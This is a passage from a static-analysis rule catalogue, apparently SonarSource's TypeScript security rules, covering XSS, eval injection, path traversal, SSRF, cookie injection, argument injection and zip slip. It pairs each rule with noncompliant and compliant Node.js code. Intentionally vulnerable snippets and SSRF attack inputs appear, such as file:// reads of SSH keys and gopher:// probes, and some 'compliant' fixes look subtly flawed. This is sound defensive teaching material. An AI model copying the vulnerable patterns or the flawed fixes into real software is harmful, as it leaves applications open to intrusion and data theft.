<a\nhref=\"https://en.wikipedia.org/wiki/Cybersquatting\">cybersquatting</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/601\">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tssecurity:S5131": {
        "name": "Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks",
        "htmlDesc": "<p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of\nthe victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back\nto the user.</p>\n<h2>Why is this an issue?</h2>\n<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming\nHTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>\n<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own\nbrowser.</p>\n<p>A user with malicious intent carefully crafts the link beforehand.</p>\n<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code\nthat can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Vandalism on the front-end website</h4>\n<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and\ntheft of the benevolent user’s data.</p>\n<h4>Identity spoofing</h4>\n<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>\n<h4>Record user activity</h4>\n<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard\nactivity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>\n<h4>Chaining XSS with other vulnerabilities</h4>\n<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For\nexample, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code\ninjection vulnerability in the admin control panel of a web application.</p>\n<h2>How to fix it in Express.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains unsanitized user input.</p>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response. For\nexample, you can use the <code>JsonResponse</code> class to safely return JSON messages.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfunction (req, res) {\n    json = JSON.stringify({ \"data\": req.query.input });\n    res.send(json);\n};\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfunction (req, res) {\n    res.json({ \"data\": req.query.input });\n};\n</pre>\n<p>It is also possible to set the content-type header manually using the <code>content_type</code> parameter when creating an\n<code>HttpResponse</code> object.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nfunction (req, res) {\n    res.send(req.query.input);\n};\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nfunction (req, res) {\n    res.set('Content-Type', 'text/plain');\n    res.send(req.query.input);\n};\n</pre>\n<h3>How does this work?</h3>\n<p>In case the response consists of HTML code, it is highly recommended to use a template engine like <a href=\"https://ejs.co/\">ejs</a> to generate\nit. This template engine separates the view from the business logic and automatically encodes the output of variables, drastically reducing the risk\nof cross-site scripting vulnerabilities.</p>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be resolved by telling them what data they are receiving with the\n<code>content-type</code> HTTP header. This header tells the browser that the response does not contain HTML code and should not be parsed and\ninterpreted as HTML. Thus, the HTTP response is not vulnerable to reflected Cross-Site Scripting.</p>\n<p>For example, setting the content-type header to <code>text/plain</code> allows to safely reflect user input since browsers will not try to parse\nand execute the response.</p>\n<h3>Pitfalls</h3>\n<h4>Content-types</h4>\n<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to\ncross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>\n<ul>\n  <li> application/mathml+xml </li>\n  <li> application/rdf+xml </li>\n  <li> application/vnd.wap.xhtml+xml </li>\n  <li> application/xhtml+xml </li>\n  <li> application/xml </li>\n  <li> image/svg+xml </li>\n  <li> multipart/x-mixed-replace </li>\n  <li> text/html </li>\n  <li> text/rdf </li>\n  <li> text/xml </li>\n  <li> text/xsl </li>\n</ul>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is\nsometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the\nfilters.</p>\n<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is\ntrying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,\nin the long run, is very difficult.</p>\n<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of \"javascript:\" URI.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">OWASP Cheat Sheet</a> - XSS\n  Prevention Cheat Sheet </li>\n  <li> <a href=\"https://expressjs.com/en/api.html\">Express, 4.x API</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/wordpress-stored-xss-vulnerability\">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/ghost-admin-takeover\">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>\n  <li> <a href=\"https://samy.pl/myspace/\">Samy Kamkar, The MySpace Worm</a> </li>\n</ul>\n<h3>Conference presentations</h3>\n<ul>\n  <li> <a href=\"https://www.youtube.com/watch?v=ksq7e6UUDag\">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tssecurity:S5334": {
        "name": "Dynamic code execution should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the\nbehavior of the targeted application and modify it to get access to sensitive data.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable\napplication.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code\nruns with root privileges, and therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of code injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to arbitrary code execution because it dynamically runs JavaScript code built from untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nfunction (req, res) {\n    let operation = req.query.operation\n    eval(`product_${operation}()`) // Noncompliant\n    res.send(\"OK\")\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nconst allowed = [\"add\", \"remove\", \"update\"]\n\nlet operationId = req.query.operationId\nconst operation = allowed[operationId]\neval(`product_${operation}()`)\nres.send(\"OK\")\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>\n<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion\nis to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>\n<h4>Dynamic parameters</h4>\n<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the\ndynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic\ncode and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and\nperform the processing.</p>\n<h4>Allow list</h4>\n<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage\nusing an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>\n<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the\nparameter is accepted. Otherwise, it is rejected and an error is raised.</p>\n<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where\nonly valid ones can be converted to a safe value.</p>\n<p>The example compliant code uses such a binding approach.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/moodle-remote-code-execution/\">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tssecurity:S2083": {
        "name": "I/O function calls should not be vulnerable to path injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting\npath would resolve somewhere in the filesystem where the user should not normally have access to.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override or delete arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited\nto remove or corrupt files that are critical for the application or for the system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h4>Read arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to\nleak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>\n<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nconst path = require('path');\nconst fs   = require('fs');\n\nfunction (req, res) {\n  const targetDirectory = \"/data/app/resources/\";\n  const userFilename = path.join(targetDirectory, req.query.filename);\n\n  let data = fs.readFileSync(userFilename, { encoding: 'utf8', flag: 'r' }); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nconst path = require('path');\nconst fs   = require('fs');\n\nfunction (req, res) {\n  const targetDirectory = \"/data/app/resources/\";\n  const userFilename = path.join(targetDirectory, req.query.filename);\n  const userFilename = fs.realPath(userFilename);\n\n  if (!userFilename.startsWith(targetDirectory)) {\n    res.status(401).send();\n  }\n\n  let data = fs.readFileSync(userFilename, { encoding: 'utf8', flag: 'r' });\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Canonical path validation</h4>\n<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths\nconstructed from untrusted data:</p>\n<ol>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>\n  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>\n  <li> Resolve the canonical path of the file by using methods like <code>`fs.realPath`</code>. This will resolve relative path or path components\n  like <code>../</code> and removes any ambiguity regarding the file’s location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n</ol>\n<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by\ndesign:</p>\n<ol>\n  <li> <code>data = transform(user_input);</code> </li>\n  <li> <code>data = normalize(data);</code> </li>\n  <li> <code>data = sanitize(data);</code> </li>\n  <li> <code>use(data);</code> </li>\n</ol>\n<p>As pointed out in <a href=\"https://www.youtube.com/watch?v=V-DdcKADnFk\">this SonarSource talk</a>, failure to follow this exact order leads to\nsecurity vulnerabilities.</p>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path\nseparator:</p>\n<pre>\nconst path = require('path');\n\nfunction (req, res) {\n  const targetDirectory = \"/data/app/resources\"\n  const userFilename = path.join(targetDirectory, req.query.filename));\n  const userFilename = fs.realPath(userFilename);\n\n  if (!userFilename.startsWith(targetDirectory)) {\n    res.status(401).send();\n  }\n\n  let data = fs.readFileSync(userFilename);\n}\n</pre>\n<p>This check can be bypassed because <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code> returns <code>true</code>. Thus, for validation,\n<code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to\nensure that it cannot be impacted by this issue.</p>\n<h4>Do not use path.resolve as a validator</h4>\n<p>The <a href=\"https://nodejs.org/api/path.html#pathresolvepaths\">official documentation</a> states that if any argument other than the first is an\nabsolute path, any previous argument is discarded.</p>\n<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal\nvulnerability.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tssecurity:S5144": {
        "name": "Server-side requests should not be vulnerable to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>\n<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s\nresponse.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be\ntreated in the same way as basic SSRF.</p>\n<h3>What is the potential impact?</h3>\n<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to\nwhat is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>\n<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can\nrange from low to critical severity.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Local file read to host takeover</h4>\n<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File\nURI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web\napplication.</p>\n<h4>Internal Network Reconnaissance</h4>\n<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port\nfield in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for\nexample, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst axios = require('axios');\nconst express = require('express');\n\nconst app = express();\n\napp.get('/example', async (req, res) =&gt; {\n    try {\n        await axios.get(req.query.url); // Noncompliant\n        res.send(\"OK\");\n    } catch (err) {\n        console.error(err);\n        res.send(\"ERROR\");\n    }\n})\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst axios = require('axios');\nconst express = require('express');\n\nconst schemesList = [\"http:\", \"https:\"];\nconst domainsList = [\"trusted1.example.com\", \"trusted2.example.com\"];\n\napp.get('/example', async (req, res) =&gt; {\n    const url = (new URL(req.query.url));\n\n    if (schemesList.includes(url.protocol) &amp;&amp; domainsList.includes(url.hostname)) {\n        try {\n            await axios.get(url);\n            res.send(\"OK\");\n        } catch (err) {\n            console.error(err);\n            res.send(\"ERROR\");\n        }\n    }else {\n        res.send(\"INVALID_URL\");\n    }\n})\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.commit.malicious.io</code>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">Top 10 2021 Category A10 - Server-Side Request\n  Forgery (SSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/918\">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "tssecurity:S6287": {
        "name": "Applications should not create session cookies from untrusted input",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>\n<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the\napplication.</p>\n<p>The injection might occur via a GET parameter, and the payload, for example, <code><a\nhref=\"https://example.com?cookie=injectedcookie\">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a\nsession that isn’t theirs.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Sensitive data disclosure</h4>\n<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of\nimplications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>\n<h4>Vulnerability chaining</h4>\n<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and\nexploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,\nwhich can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>\n<h2>How to fix it in Express.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport express from \"express\";\nimport cookieParser from \"cookie-parser\";\n\nconst app = express();\napp.use(cookieParser());\n\napp.get(\"/checkcookie\", (req, res) =&gt; {\n    if (req.cookies[\"connect.sid\"] === undefined) {\n        const cookie = req.query.cookie;\n        res.cookie(\"connect.sid\", cookie); // Noncompliant\n    }\n\n    return res.redirect(\"/welcome\");\n});\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport express from \"express\";\nimport cookieParser from \"cookie-parser\";\n\nconst app = express();\napp.use(cookieParser());\n\napp.get(\"/checkcookie\", (req, res) =&gt; {\n    if (req.cookies[\"connect.sid\"] === undefined) {\n        return res.redirect(\"/getcookie\");\n    }\n\n    return res.redirect(\"/welcome\");\n});\n</pre>\n<h3>How does this work?</h3>\n<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the\nvalue of a session cookie to untrusted data.</p>\n<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade\ntools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to\nuse these solutions than to develop your own.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "tssecurity:S6350": {
        "name": "Constructing arguments of system commands from user input is security-sensitive",
        "htmlDesc": "<p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920\">CVE-2016-9920</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472\">CVE-2021-29472</a> </li>\n</ul>\n<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the\nprograms. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing\nfiles into specific directories.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Malicious arguments can result in undesired behavior in the executed command. </li>\n  <li> Passing user input to a system command is not necessary. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid constructing system commands from user input when possible. </li>\n  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>\n  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in\nvulnerabilities:</p>\n<pre>\nconst { spawn } = require(\"child_process\");\nconst input = req.query.input;\nconst proc = spawn(\"/usr/bin/find\", [input]); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Use an allow-list to restrict the arguments to trusted values:</p>\n<pre>\nconst { spawn } = require(\"child_process\");\nconst input = req.query.input;\nif (allowed.includes(input)) {\n  const proc = spawn(\"/usr/bin/find\", [input]);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/php-supply-chain-attack-on-composer\">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>\n</ul>",
        "severity": "MAJOR"
      },
      "tssecurity:S6096": {
        "name": "Extracting archives should not lead to zip slip vulnerabilities",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access\nthis file without validating its path first.</p>\n<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial\nintended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override arbitrary files</h4>\n<p>The application opens the archive to copy its entries to the file system. The entries' names contain path traversal payloads for existing files in\nthe system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or\noperating system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file\nwithout being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst AdmZip = require(\"adm-zip\");\nconst upload = require('multer');\n\napp.get('/example', upload.single('file'), (req, res) =&gt; {\n    const zip = new AdmZip(req.file.buffer);\n    const zipEntries = zip.getEntries();\n\n    zipEntries.forEach(function (zipEntry) {\n        var writer = fs.createWriteStream(zipEntry.entryName); // Noncompliant\n        writer.write(zipEntry.getData().toString(\"utf8\"));\n    });\n});\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst AdmZip = require(\"adm-zip\");\nconst upload = require('multer');\n\nconst unzipTargetDir = \"/example/directory/\";\n\napp.get('/example', upload.single('file'), (req, res) =&gt; {\n    const zip = new AdmZip(req.file.buffer);\n    const zipEntries = zip.getEntries();\n\n    zipEntries.forEach(function (zipEntry) {\n        const canonicalPath = path.normalize(unzipTargetDir + 